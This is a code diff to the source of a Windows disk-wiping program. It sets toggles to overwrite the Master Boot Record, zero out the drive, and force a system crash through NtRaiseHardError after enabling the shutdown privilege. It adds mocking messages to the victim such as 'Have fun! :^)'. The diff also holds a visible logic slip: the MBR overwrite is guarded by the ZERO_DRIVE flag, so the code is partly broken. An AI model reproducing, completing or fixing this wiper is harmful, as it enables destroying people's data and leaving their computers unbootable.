@@ -15,9 +15,10 @@
 #define MBR_SIZE 512
 
 //GENERAL ARGUMENTS
-#define OW_MBR 1
-#define ZERO_DRIVE 0
-#define BSOD 1
+//COMMENT OUT TO DISABLE A SPECIFIC FEATURE
+    #define OW_MBR 
+//  #define ZERO_DRIVE 
+    #define BSOD 
 
 
 
@@ -45,13 +46,13 @@ extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParam
 
 
 
-void BlueScreen()
+bool BlueScreen()
 {
     BOOLEAN bl;
     ULONG Response;
     RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // Enable SeShutdownPrivilege
     NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdown
-
+    return 1;
     
 }
 
@@ -128,23 +129,29 @@ bool ZeroDrive()
 int main()
 {
 
-    if (OW_MBR)
+#ifdef ZERO_DRIVE
+    
+    if (OverwriteMBR())
     {
-        if (OverwriteMBR())
-        {
-            printf("Master Bootloader Overwrittten. \nHave fun! :^) \n");
-        }
+        printf("Master Bootloader Overwrittten. \nHave fun! :^) \n");
     }
+#endif
     
 
-    if (ZERO_DRIVE)
+#ifdef ZERO_DRIVE
+    if (ZeroDrive())
     {
-        ZeroDrive();
+        printf("Zeroed out some of your drive :D");
     }
-    if (BSOD)
+#endif
+
+#ifdef BSOD
+    
+    if (BlueScreen())
     {
-        BlueScreen();
-    }
+        printf("Bluescreening your pc :P");
+    };
+#endif
     
 
 
